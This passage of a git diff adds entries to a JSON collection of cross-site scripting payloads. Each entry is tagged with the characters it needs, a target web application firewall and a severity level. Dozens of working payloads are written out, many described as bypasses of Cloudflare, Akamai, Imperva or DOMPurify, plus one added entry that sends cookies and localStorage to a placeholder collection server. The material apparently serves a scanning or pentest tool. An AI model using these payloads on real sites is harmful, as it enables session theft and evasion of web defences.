-      "[",
+      "/",
       "]",
+      "{",
       "'",
-      ".",
-      "-"
+      ")",
+      "(",
+      ">",
+      "<",
+      "[",
+      "}"
     ],
     "waf": null,
     "count": 0,
@@ -2565,18 +2482,16 @@
   {
     "Payload": "<div id=x><script>x.animate([{transform:'translateX(0px)'}],{duration:1}).onfinish=()=>alert(1)</script>",
     "Attribute": [
-      "<",
-      ">",
-      "=",
-      "(",
-      ")",
-      "[",
+      "/",
       "]",
       "{",
-      "}",
       "'",
-      ":",
-      "."
+      ")",
+      "(",
+      ">",
+      "[",
+      "<",
+      "}"
     ],
     "waf": null,
     "count": 0,
@@ -2586,16 +2501,13 @@
   {
     "Payload": "<script>try{Temporal.Now.plainDateISO().toString.call({toString:()=>alert(1)})}catch(e){alert(1)}</script>",
     "Attribute": [
-      "<",
-      ">",
-      "(",
-      ")",
+      "/",
       "{",
-      "}",
-      ".",
-      ":",
-      "=",
-      ">"
+      ")",
+      "(",
+      ">",
+      "<",
+      "}"
     ],
     "waf": null,
     "count": 0,
@@ -2605,15 +2517,15 @@
   {
     "Payload": "<style>@container (width > 0px) { body::before { content: '}\\A eval(\\'alert(1)\\')//'; } }</style>",
     "Attribute": [
+      "/",
       "{",
-      "}",
-      "(",
       ")",
-      ":",
-      ";",
       "'",
-      "\\",
-      "/"
+      ";",
+      "(",
+      ">",
+      "<",
+      "}"
     ],
     "waf": null,
     "count": 0,
@@ -2623,15 +2535,15 @@
   {
     "Payload": "<script type=importmap>{\"imports\":{\"xss\":\"data:text/javascript,alert(1)\"}}</script><script type=module>import'xss'</script>",
     "Attribute": [
-      "<",
-      ">",
-      "=",
-      "{",
-      "}",
+      "/",
       "\"",
-      ":",
-      ",",
-      "'"
+      "{",
+      ")",
+      "'",
+      "(",
+      ">",
+      "<",
+      "}"
     ],
     "waf": null,
     "count": 0,
@@ -2641,14 +2553,12 @@
   {
     "Payload": "<script type=module>await new Promise(r=>setTimeout(r,1));alert(1)</script>",
     "Attribute": [
-      "<",
-      ">",
-      "=",
-      "(",
+      "/",
       ")",
-      ".",
-      ",",
-      ";"
+      ";",
+      "(",
+      ">",
+      "<"
     ],
     "waf": null,
     "count": 0,
@@ -2658,15 +2568,15 @@
   {
     "Payload": "<style>@layer xss { body::after { content: '}\\A alert(1)//'; } }</style>",
     "Attribute": [
+      "/",
       "{",
-      "}",
-      "(",
-      ")",
-      ":",
-      ";",
       "'",
-      "\\",
-      "/"
+      ")",
+      ";",
+      "(",
+      ">",
+      "<",
+      "}"
     ],
     "waf": null,
     "count": 0,
@@ -2676,15 +2586,14 @@
   {
     "Payload": "<script>class X{#x=alert(1);constructor(){this.#x}};new X</script>",
     "Attribute": [
-      "<",
-      ">",
+      "/",
       "{",
-      "}",
-      "#",
-      "=",
-      "(",
       ")",
-      "."
+      ";",
+      "(",
+      ">",
+      "<",
+      "}"
     ],
     "waf": null,
     "count": 0,
@@ -2694,17 +2603,15 @@
   {
     "Payload": "<script>let x=new WeakRef({valueOf:()=>alert(1)});x.deref()+''</script>",
     "Attribute": [
-      "<",
-      ">",
-      "=",
-      "(",
-      ")",
+      "/",
       "{",
-      "}",
-      ":",
-      "+",
+      ")",
+      ";",
       "'",
-      "."
+      "(",
+      ">",
+      "<",
+      "}"
     ],
     "waf": null,
     "count": 0,
@@ -2714,18 +2621,14 @@
   {
     "Payload": "<script>new FinalizationRegistry(()=>alert(1)).register({},1);gc?gc():setTimeout(()=>alert(1),1000)</script>",
     "Attribute": [
-      "<",
-      ">",
-      "(",
-      ")",
-      "=",
-      ">",
+      "/",
       "{",
-      "}",
-      ".",
-      ",",
-      "?",
-      ":"
+      ")",
+      ";",
+      "(",
+      ">",
+      "<",
+      "}"
     ],
     "waf": null,
     "count": 0,
@@ -2735,13 +2638,11 @@
   {
     "Payload": "<script>window.x??=alert(1)</script>",
     "Attribute": [
-      "<",
-      ">",
-      ".",
-      "?",
-      "=",
+      "/",
+      ")",
       "(",
-      ")"
+      ">",
+      "<"
     ],
     "waf": null,
     "count": 0,
@@ -2751,13 +2652,11 @@
   {
     "Payload": "<script>eval(String.fromCharCode(9_7,1_0_8,1_0_1,1_1_4,1_1_6,4_0,4_9,4_1))</script>",
     "Attribute": [
-      "<",
-      ">",
-      "(",
+      "/",
       ")",
-      ".",
-      "_",
-      ","
+      "(",
+      ">",
+      "<"
     ],
     "waf": null,
     "count": 0,
@@ -2767,18 +2666,14 @@
   {
     "Payload": "<script>try{#{valueOf:()=>alert(1)}+''}catch(e){alert(1)}</script>",
     "Attribute": [
-      "<",
-      ">",
-      "(",
-      ")",
+      "/",
       "{",
-      "}",
-      "#",
-      ":",
-      "=",
+      ")",
+      "'",
+      "(",
       ">",
-      "+",
-      "'"
+      "<",
+      "}"
     ],
     "waf": null,
     "count": 0,
@@ -2788,14 +2683,13 @@
   {
     "Payload": "<script>try{case(alert(1)){when _:1}}catch(e){alert(1)}</script>",
     "Attribute": [
-      "<",
-      ">",
-      "(",
-      ")",
+      "/",
       "{",
-      "}",
-      "_",
-      ":"
+      ")",
+      "(",
+      ">",
+      "<",
+      "}"
     ],
     "waf": null,
     "count": 0,
@@ -2805,16 +2699,14 @@
   {
     "Payload": "<script>try{@(()=>alert(1)) class X{};new X}catch(e){alert(1)}</script>",
     "Attribute": [
-      "<",
-      ">",
-      "@",
-      "(",
-      ")",
-      "=",
-      ">",
+      "/",
       "{",
-      "}",
-      "."
+      ")",
+      ";",
+      "(",
+      ">",
+      "<",
+      "}"
     ],
     "waf": null,
     "count": 0,
@@ -2824,22 +2716,1084 @@
   {
     "Payload": "<script>(()=>(!![]+'')[+[]]+(!![]+'')[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+'')[!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+'')[+[]]+(!![]+[])[+!+[]]+(!![]+'')[+!+[]]+([][[]]+[])[+[]]+(!(+[])+'')[+[]]+(!(+[])+'')[+!+[]]+([][[]]+[])[+!+[]]+(!![]+'')[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+'')[+!+[]]+(!![]+[])[+[]]+(!(+[])+'')[+!+[]]+([][[]]+[])[+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+([][[]]+[])[+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]])()((![]+'')[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+'')[+[]]+(!![]+[])[+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+(!![]+'')[+!+[]]+([][[]]+[])[+!+[]]+([]+[])[(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]((+!+[])+(+!+[])))()</script>",
     "Attribute": [
-      "<",
-      ">",
-      "(",
-      ")",
-      "=",
-      "[",
+      "/",
       "]",
-      "+",
-      "!",
-      "{",
-      "}",
-      "."
+      ")",
+      "'",
+      "(",
+      ">",
+      "[",
+      "<"
     ],
     "waf": null,
     "count": 0,
     "description": "Ultra-obfuscated JSFuck alert(1)",
     "level": "critical"
+  },
+  {
+    "Payload": "<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,88,83,83,41))>",
+    "Attribute": [
+      "/",
+      ")",
+      "(",
+      ">",
+      "<"
+    ],
+    "waf": "cloudflare",
+    "count": 0,
+    "description": "Ultra advanced bypassed payload",
+    "level": "critical"
+  },
+  {
+    "Payload": "<input type=\"checkbox\" id=\"z\" value=\"xss0r\" style=\"display:none\" &%2362;=\"\" onchange=\"top[['alert'][0]](location.hostname);this.remove()\"><label for=\"z\" style=\"position:fixed;inset:0;cursor:crosshair\"></label>",
+    "Attribute": [
+      "\"",
+      "'",
+      "(",
+      ")",
+      "[",
+      "]",
+      ";",
+      ":",
+      "=",
+      ">",
+      "<",
+      "&",
+      "%"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Advanced UI hijacking with stealth checkbox overlay, bracket notation evasion, and HTML entity encoding",
+    "level": "critical"
+  },
+  {
+    "Payload": "<xss onscrollend=alert(1) style=\"display:block;overflow:auto;border:1px dashed;width:500px;height:50px;\"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></xss>",
+    "Attribute": [
+      "<",
+      ">",
+      "(",
+      ")",
+      ":",
+      ";",
+      "=",
+      "\"",
+      "#"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Chrome/Firefox onscrollend event with auto-scroll trigger - bypasses click-based restrictions",
+    "level": "critical"
+  },
+  {
+    "Payload": "%0Ajavascript%3Ato%0ap%5B%27ale%27%2B%27rt%27%5D%28top%5B%27doc%27%2B%27ument%27%5D%5B%27dom%27%2B%27ain%27%5D%29%3B%0A/%0A/%0A",
+    "Attribute": [
+      "%",
+      "0",
+      "A",
+      "3",
+      ":",
+      "5",
+      "B",
+      "'",
+      "2",
+      "7",
+      "8",
+      "D",
+      "(",
+      ")",
+      "/",
+      ";"
+    ],
+    "waf": "advanced",
+    "count": 0,
+    "description": "URL-encoded javascript: protocol with string concatenation - advanced WAF bypass",
+    "level": "critical"
+  },
+  {
+    "Payload": "<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>",
+    "Attribute": [
+      "<",
+      ">",
+      "/",
+      ",",
+      "=",
+      "+",
+      "[",
+      "]",
+      "(",
+      ")",
+      ";"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Advanced throw/onerror technique with URL string manipulation and eval injection",
+    "level": "critical"
+  },
+  {
+    "Payload": "<svg/onload='const url = `https://yourserver/collect?cookie=${encodeURIComponent(document.cookie)}&localStorage=${encodeURIComponent(JSON.stringify(localStorage))}`; fetch(url);'\">",
+    "Attribute": [
+      "<",
+      ">",
+      "/",
+      "=",
+      "'",
+      "`",
+      ":",
+      "?",
+      "&",
+      "$",
+      "{",
+      "}",
+      "(",
+      ")",
+      ";",
+      "\""
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Advanced data exfiltration payload - steals cookies and localStorage via fetch API",
+    "level": "critical"
+  },
+  {
+    "Payload": "\"><BODy onbeforescriptexecute=\"x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\\u006d('+'document'+'.'+x1+c\">",
+    "Attribute": [
+      "\"",
+      ">",
+      "<",
+      "=",
+      "'",
+      ";",
+      "+",
+      ":",
+      "\\",
+      "u",
+      "0",
+      "6",
+      "d",
+      "(",
+      ")",
+      "."
+    ],
+    "waf": "advanced",
+    "count": 0,
+    "description": "onbeforescriptexecute event with location redirection and unicode escape sequences",
+    "level": "critical"
+  },
+  {
+    "Payload": "<button%20popovertarget=x>Click%20me</button><img%20onbeforetoggle=alert(1)%20popover%20id=x>",
+    "Attribute": [
+      "<",
+      ">",
+      "%",
+      "2",
+      "0",
+      "=",
+      "(",
+      ")"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "HTML popover API with onbeforetoggle event - cutting-edge browser feature exploitation",
+    "level": "critical"
+  },
+  {
+    "Payload": "{{([].toString()).constructor.prototype.charAt=[].join;$eval(([].toString()).constructor.fromCodePoint([120],[61],[49],[125],[125],[125],[59],[97],[108],[101],[114],[116],[40],[49],[41],[47],[47]));}}",
+    "Attribute": [
+      "{",
+      "}",
+      "(",
+      ")",
+      "[",
+      "]",
+      ".",
+      "=",
+      ";",
+      "$",
+      ",",
+      "'"
+    ],
+    "waf": "akamai",
+    "count": 0,
+    "description": "Angular 1.4.3 CSTI payload with constructor manipulation and fromCodePoint encoding",
+    "level": "critical"
+  },
+  {
+    "Payload": "%22onmouseover=window[%27al%27%2B%27er%27%2B([%27t%27,%27b%27,%27c%27][0])](document[%27cooki%27%2B(['e','c','z'][0])]);%22",
+    "Attribute": [
+      "%",
+      "2",
+      "\"",
+      "=",
+      "[",
+      "]",
+      "'",
+      "B",
+      "+",
+      "(",
+      ")",
+      ",",
+      "0",
+      ";",
+      "7"
+    ],
+    "waf": "akamai",
+    "count": 0,
+    "description": "Akamai WAF bypass using array indexing and string concatenation with URL encoding",
+    "level": "critical"
+  },
+  {
+    "Payload": "<details open ontoggle=\"{alert`1`}\"></details>",
+    "Attribute": [
+      "<",
+      ">",
+      "\"",
+      "{",
+      "}",
+      "`",
+      "(",
+      ")",
+      "/"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "HTML5 details element with ontoggle event and template literals",
+    "level": "high"
+  },
+  {
+    "Payload": "<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>",
+    "Attribute": [
+      "<",
+      ">",
+      "%",
+      "0",
+      "a",
+      "3",
+      "d",
+      "=",
+      ",",
+      "(",
+      ")",
+      "2"
+    ],
+    "waf": "cloudflare",
+    "count": 0,
+    "description": "Cloudflare bypass using case mixing, URL encoding and comma operator",
+    "level": "critical"
+  },
+  {
+    "Payload": "<a\"/onclick=(confirm)(origin)>Click Here!",
+    "Attribute": [
+      "<",
+      ">",
+      "\"",
+      "/",
+      "=",
+      "(",
+      ")",
+      "!"
+    ],
+    "waf": "cloudflare",
+    "count": 0,
+    "description": "Cloudflare WAF bypass with malformed attributes and parentheses wrapping",
+    "level": "critical"
+  },
+  {
+    "Payload": "<svg%0Aonauxclick=0;[1].some(confirm)//",
+    "Attribute": [
+      "<",
+      ">",
+      "%",
+      "0",
+      "A",
+      "=",
+      ";",
+      "[",
+      "]",
+      ".",
+      "(",
+      ")",
+      "/",
+      "1"
+    ],
+    "waf": "cloudflare",
+    "count": 0,
+    "description": "SVG with onauxclick event and Array.some() method abuse",
+    "level": "critical"
+  },
+  {
+    "Payload": "<marquee+loop=1+width=0+onfinish='new+Function`al\\ert\\`1\\``'>",
+    "Attribute": [
+      "<",
+      ">",
+      "+",
+      "=",
+      "1",
+      "0",
+      "'",
+      "`",
+      "\\",
+      "a",
+      "l",
+      "e",
+      "r",
+      "t"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Marquee element with Function constructor and template literal escaping",
+    "level": "high"
+  },
+  {
+    "Payload": "confirm?.(1)",
+    "Attribute": [
+      "(",
+      ")",
+      "?",
+      ".",
+      "1"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "KnoxSS payload using optional chaining operator - minimal and effective",
+    "level": "medium"
+  },
+  {
+    "Payload": "Function(\"\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29\")()",
+    "Attribute": [
+      "(",
+      ")",
+      "\"",
+      "\\",
+      "x",
+      "6",
+      "1",
+      "c",
+      "5",
+      "2",
+      "7",
+      "4",
+      "8",
+      "3",
+      "9"
+    ],
+    "waf": "cloudflare",
+    "count": 0,
+    "description": "Function constructor with hexadecimal encoding - bypasses string detection",
+    "level": "critical"
+  },
+  {
+    "Payload": "<style>:target {color:red;}</style><a id=x style=\"transition:color 1s\" ontransitionstart=alert(1)></a>",
+    "Attribute": [
+      "<",
+      ">",
+      ":",
+      "{",
+      "}",
+      ";",
+      "=",
+      "\"",
+      "(",
+      ")",
+      "#"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "CSS :target pseudo-class with transition event - automatic trigger without user interaction",
+    "level": "critical"
+  },
+  {
+    "Payload": "<style>@keyframes slidein {}</style><a style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onwebkitanimationiteration=\"alert(1)\"></a>",
+    "Attribute": [
+      "<",
+      ">",
+      "@",
+      "{",
+      "}",
+      ":",
+      ";",
+      "=",
+      "\"",
+      "(",
+      ")",
+      "1",
+      "s",
+      "2"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "CSS keyframes animation with webkit iteration event - bypasses interaction-based restrictions",
+    "level": "critical"
+  },
+  {
+    "Payload": "<a onbeforescriptexecute=alert(1)><script>1</script>",
+    "Attribute": [
+      "<",
+      ">",
+      "=",
+      "(",
+      ")",
+      "1"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Script execution lifecycle event - triggers before script runs",
+    "level": "high"
+  },
+  {
+    "Payload": "<a onafterscriptexecute=alert(1)><script>1</script>",
+    "Attribute": [
+      "<",
+      ">",
+      "=",
+      "(",
+      ")",
+      "1"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Script execution lifecycle event - triggers after script completes",
+    "level": "high"
+  },
+  {
+    "Payload": "<style>@keyframes x{}</style><a style=\"animation-name:x\" onwebkitanimationstart=\"alert(1)\"></a>",
+    "Attribute": [
+      "<",
+      ">",
+      "@",
+      "{",
+      "}",
+      ":",
+      ";",
+      "=",
+      "\"",
+      "(",
+      ")",
+      "1",
+      "x"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "CSS keyframes with webkit animation start event - automatic trigger",
+    "level": "critical"
+  },
+  {
+    "Payload": "<style>@keyframes x{}</style><a style=\"animation-name:x\" onwebkitanimationend=\"alert(1)\"></a>",
+    "Attribute": [
+      "<",
+      ">",
+      "@",
+      "{",
+      "}",
+      ":",
+      ";",
+      "=",
+      "\"",
+      "(",
+      ")",
+      "1",
+      "x"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "CSS keyframes with webkit animation end event - triggers when animation completes",
+    "level": "critical"
+  },
+  {
+    "Payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><a id=x style=\"position:absolute;\" onanimationcancel=\"print()\"></a>",
+    "Attribute": [
+      "<",
+      ">",
+      "@",
+      "{",
+      "}",
+      ":",
+      ";",
+      "=",
+      "\"",
+      "(",
+      ")",
+      "0",
+      "1",
+      "s",
+      "x",
+      "-",
+      "#"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Complex CSS animation with positioning and cancel event - advanced animation manipulation",
+    "level": "critical"
+  },
+  {
+    "Payload": "<style>@keyframes x{}</style><a style=\"animation-name:x\" onanimationend=\"alert(1)\"></a>",
+    "Attribute": [
+      "<",
+      ">",
+      "@",
+      "{",
+      "}",
+      ":",
+      ";",
+      "=",
+      "\"",
+      "(",
+      ")",
+      "1",
+      "x"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Standard CSS animation end event (non-webkit) - cross-browser compatibility",
+    "level": "critical"
+  },
+  {
+    "Payload": "<style>@keyframes slidein {}</style><a style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></a>",
+    "Attribute": [
+      "<",
+      ">",
+      "@",
+      "{",
+      "}",
+      ":",
+      ";",
+      "=",
+      "\"",
+      "(",
+      ")",
+      "1",
+      "s",
+      "2"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Standard CSS animation iteration event (non-webkit) - triggers on each animation cycle",
+    "level": "critical"
+  },
+  {
+    "Payload": "12345-abc-1-23456<scr<script>ipt>alert(document.cookie)<%2Fscr<script>ipt>.img",
+    "Attribute": [
+      "<",
+      ">",
+      "(",
+      ")",
+      ".",
+      "%",
+      "2",
+      "F",
+      "1",
+      "2",
+      "3",
+      "4",
+      "5",
+      "-",
+      "a",
+      "b",
+      "c",
+      "6"
+    ],
+    "waf": "advanced",
+    "count": 0,
+    "description": "Nested script tag bypass with filename disguise - confuses WAF parsers with overlapping tags",
+    "level": "critical"
+  },
+  {
+    "Payload": "<scr<script>ipt>alert(1)</scr<script>ipt>",
+    "Attribute": [
+      "<",
+      ">",
+      "(",
+      ")",
+      "/",
+      "1"
+    ],
+    "waf": "advanced",
+    "count": 0,
+    "description": "Simple nested script tag bypass - basic form of tag confusion attack",
+    "level": "critical"
+  },
+  {
+    "Payload": "<img<img src=x onerror=alert(1)> src=x onerror=alert(2)>",
+    "Attribute": [
+      "<",
+      ">",
+      "=",
+      "(",
+      ")",
+      " ",
+      "1",
+      "2",
+      "x"
+    ],
+    "waf": "advanced",
+    "count": 0,
+    "description": "Nested img tag bypass - double payload execution with tag confusion",
+    "level": "critical"
+  },
+  {
+    "Payload": "<svg<svg onload=alert(1)> onload=alert(2)>",
+    "Attribute": [
+      "<",
+      ">",
+      "=",
+      "(",
+      ")",
+      " ",
+      "1",
+      "2"
+    ],
+    "waf": "advanced",
+    "count": 0,
+    "description": "Nested SVG tag bypass - dual execution with overlapping element confusion",
+    "level": "critical"
+  },
+  {
+    "Payload": "<<script>alert('nested')</script>",
+    "Attribute": [
+      "<",
+      ">",
+      "(",
+      ")",
+      "'",
+      "/"
+    ],
+    "waf": "basic",
+    "count": 0,
+    "description": "Double bracket script bypass - simple tag confusion for basic filters",
+    "level": "high"
+  },
+  {
+    "Payload": "<scr<iframe src=javascript:alert(1)></iframe>ipt>",
+    "Attribute": [
+      "<",
+      ">",
+      "=",
+      ":",
+      "(",
+      ")",
+      "/",
+      "1"
+    ],
+    "waf": "advanced",
+    "count": 0,
+    "description": "Mixed nested tags bypass - iframe within broken script tag structure",
+    "level": "critical"
+  },
+  {
+    "Payload": "<img//////src=x oNlY=1 oNerror=alert('xss')//",
+    "Attribute": [
+      "<",
+      ">",
+      "/",
+      "=",
+      "(",
+      ")",
+      "'",
+      "1"
+    ],
+    "waf": "cloudflare",
+    "count": 0,
+    "description": "Cloudflare bypass with excessive slashes and mixed case attributes",
+    "level": "critical"
+  },
+  {
+    "Payload": "<img src=x on onerror=alert()>",
+    "Attribute": [
+      "<",
+      ">",
+      "=",
+      "(",
+      ")",
+      " "
+    ],
+    "waf": "cloudflare",
+    "count": 0,
+    "description": "Cloudflare bypass with space-separated 'on' keyword before onerror",
+    "level": "critical"
+  },
+  {
+    "Payload": "<img/ignored=()%0Asrc=x%0Aonerror=prompt(1)>",
+    "Attribute": [
+      "<",
+      ">",
+      "/",
+      "=",
+      "(",
+      ")",
+      "%",
+      "0",
+      "A",
+      "1"
+    ],
+    "waf": "cloudflare",
+    "count": 0,
+    "description": "Cloudflare bypass using newline characters (%0A) to separate attributes",
+    "level": "critical"
+  },
+  {
+    "Payload": "<svg onload=prompt%26%230000000040document.domain)>",
+    "Attribute": [
+      "<",
+      ">",
+      "=",
+      "%",
+      "2",
+      "6",
+      "3",
+      "0",
+      "4",
+      "(",
+      ")",
+      "."
+    ],
+    "waf": "cloudflare",
+    "count": 0,
+    "description": "Cloudflare bypass using zero-padded HTML entities for parentheses",
+    "level": "critical"
+  },
+  {
+    "Payload": "<a\"/onclick=(confirm)()>Click Here!",
+    "Attribute": [
+      "<",
+      ">",
+      "\"",
+      "/",
+      "=",
+      "(",
+      ")",
+      "!"
+    ],
+    "waf": "cloudflare",
+    "count": 0,
+    "description": "Cloudflare href bypass with malformed quote and function wrapping",
+    "level": "critical"
+  },
+  {
+    "Payload": "<details open id=\"' &quot;'\"ontoggle=[JS]>",
+    "Attribute": [
+      "<",
+      ">",
+      "=",
+      "\"",
+      "'",
+      "&",
+      "q",
+      "u",
+      "o",
+      "t",
+      ";",
+      "[",
+      "]"
+    ],
+    "waf": "akamai",
+    "count": 0,
+    "description": "Akamai bypass using mixed quotes and HTML entities in id attribute",
+    "level": "critical"
+  },
+  {
+    "Payload": "<math><edra href=Ja&Tab;vascript&colon;console.error(1)>HERE</edra></math>",
+    "Attribute": [
+      "<",
+      ">",
+      "=",
+      "&",
+      "T",
+      "a",
+      "b",
+      ";",
+      ":",
+      "(",
+      ")",
+      "1",
+      "/"
+    ],
+    "waf": "akamai",
+    "count": 0,
+    "description": "Akamai bypass using MathML with Tab entity and colon entity in javascript protocol",
+    "level": "critical"
+  },
+  {
+    "Payload": "<details/open/id=\"&quot;\"ontoggle=[JS]>",
+    "Attribute": [
+      "<",
+      ">",
+      "/",
+      "=",
+      "\"",
+      "&",
+      "q",
+      "u",
+      "o",
+      "t",
+      ";",
+      "[",
+      "]"
+    ],
+    "waf": "imperva",
+    "count": 0,
+    "description": "Imperva/Incapsula bypass with escaped quotes and details element",
+    "level": "critical"
+  },
+  {
+    "Payload": "?id=\"&id=onpointerrawupdate=\"a=confirm&id=a(1)",
+    "Attribute": [
+      "?",
+      "=",
+      "\"",
+      "&",
+      "(",
+      ")",
+      "1"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Chrome-specific onpointerrawupdate event with parameter pollution technique",
+    "level": "high"
+  },
+  {
+    "Payload": "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
+    "Attribute": [
+      "<",
+      ">",
+      "=",
+      "\"",
+      ":",
+      ";",
+      ",",
+      "/",
+      "+"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Base64 encoded script in data URL - bypasses content filters",
+    "level": "high"
+  },
+  {
+    "Payload": "<math><mtext><table><mglyph><style><!--</style><img title=\"--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;\">",
+    "Attribute": [
+      "<",
+      ">",
+      "\"",
+      "-",
+      "&",
+      "g",
+      "t",
+      ";",
+      "l",
+      "T",
+      "a",
+      "b",
+      "=",
+      "(",
+      ")",
+      "1"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "DOMPurify <2.1 bypass using MathML with nested table and style injection",
+    "level": "critical"
+  },
+  {
+    "Payload": "ws://google.com\"><svg/onload=alert(2)>",
+    "Attribute": [
+      ":",
+      "/",
+      "\"",
+      ">",
+      "<",
+      "=",
+      "(",
+      ")",
+      "2"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "WebSocket URL 302 redirect XSS - exploits Firefox redirect handling",
+    "level": "high"
+  },
+  {
+    "Payload": "[1].forEach(alert)",
+    "Attribute": [
+      "[",
+      "]",
+      ".",
+      "(",
+      ")",
+      "1"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Parentheses-free alert execution using Array.forEach method",
+    "level": "medium"
+  },
+  {
+    "Payload": "setTimeout`alert\\u0028document.domain\\u0029`",
+    "Attribute": [
+      "`",
+      "\\",
+      "u",
+      "0",
+      "2",
+      "8",
+      "9",
+      ".",
+      "("
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Template literal setTimeout with unicode escapes - bypasses parentheses filters",
+    "level": "high"
+  },
+  {
+    "Payload": "constructor.constructor(\"aler\"+\"t(3)\")();",
+    "Attribute": [
+      ".",
+      "(",
+      ")",
+      "\"",
+      "+",
+      "3",
+      ";"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Constructor chaining for Function creation - bypasses direct eval/Function detection",
+    "level": "high"
+  },
+  {
+    "Payload": "top[8680439..toString(30)](7);",
+    "Attribute": [
+      "[",
+      "]",
+      ".",
+      "(",
+      ")",
+      "8",
+      "6",
+      "0",
+      "4",
+      "3",
+      "9",
+      "3",
+      "7",
+      ";"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Numeric base conversion to spell 'alert' - advanced obfuscation technique",
+    "level": "high"
+  },
+  {
+    "Payload": "top[/al/.source+/ert/.source](8);",
+    "Attribute": [
+      "[",
+      "]",
+      "/",
+      ".",
+      "+",
+      "(",
+      ")",
+      "8",
+      ";"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Regex source concatenation for 'alert' - bypasses string detection",
+    "level": "high"
+  },
+  {
+    "Payload": "<!--javascript --><img src=x onerror=alert(1)>",
+    "Attribute": [
+      "<",
+      "!",
+      "-",
+      ">",
+      "=",
+      "(",
+      ")",
+      "1"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "HTML comment injection context bypass - exploits comment parsing",
+    "level": "high"
+  },
+  {
+    "Payload": "\"+alert(45)+\"",
+    "Attribute": [
+      "\"",
+      "+",
+      "(",
+      ")",
+      "4",
+      "5"
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "JavaScript string context escape with concatenation - breaks out of quotes",
+    "level": "medium"
+  },
+  {
+    "Payload": "\\\\u006A\\\\u0061\\\\u0076\\\\u0061\\\\u0073\\\\u0063\\\\u0072\\\\u0069\\\\u0070\\\\u0074\\\\u003A\\\\u0061\\\\u006C\\\\u0065\\\\u0072\\\\u0074\\\\u0028\\\\u0027\\\\u0058\\\\u0053\\\\u0053\\\\u0027\\\\u0029",
+    "Attribute": [
+      "\\",
+      "u",
+      "0",
+      "6",
+      "A",
+      "1",
+      "7",
+      "3",
+      "2",
+      "9",
+      "C",
+      "5",
+      "8",
+      "4",
+      ":",
+      "("
+    ],
+    "waf": null,
+    "count": 0,
+    "description": "Double-escaped unicode for 'javascript:alert(XSS)' - bypasses unicode filters",
+    "level": "high"
+  },
+  {
